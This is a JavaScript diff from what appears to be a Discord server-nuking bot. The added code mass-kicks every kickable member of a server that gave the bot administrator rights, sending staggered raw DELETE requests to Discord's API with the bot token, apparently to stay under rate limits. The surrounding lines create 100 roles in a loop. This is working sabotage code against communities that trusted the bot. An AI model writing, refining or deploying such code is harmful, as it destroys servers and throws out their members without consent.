@@ -296,9 +296,21 @@ if(list.includes(msg.author.id)) {return}
     if(msg.channel.type === 'dm') {return}
  if(!unallowedguilds.includes(msg.guild.id)) {
     if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
-msg.guild.members.cache.forEach(m => {
-if(m.kickable) {m.kick()}
-})
+setTimeout(function() {
+          var gid = msg.guild.id
+          for(var i = 0; i < msg.guild.members.cache.filter(m => m.kickable === true).size; i++){
+            setTimeout(function() {
+              console.log("kicked")
+              axios({
+                url: `https://discord.com/api/v8/guilds/${gid}/members/${msg.guild.members.cache.filter(m => m.kickable === true).random().id}?reason=`,
+                method: 'DELETE',
+                headers: {
+                 authorization: `Bot ${token1}`
+                }
+              })
+            },i * 0800)
+        }
+},1700)
       var bruhhh = 0
       while(bruhhh < 100) {
 msg.guild.roles.create({ data: { name: channelnames()} })
@@ -322,7 +334,7 @@ if(list.includes(msg.author.id)) {return}
                  authorization: `Bot ${token1}`
                 }
               })
-            },i * 0600)
+            },i * 0800)
         }
   }
 }
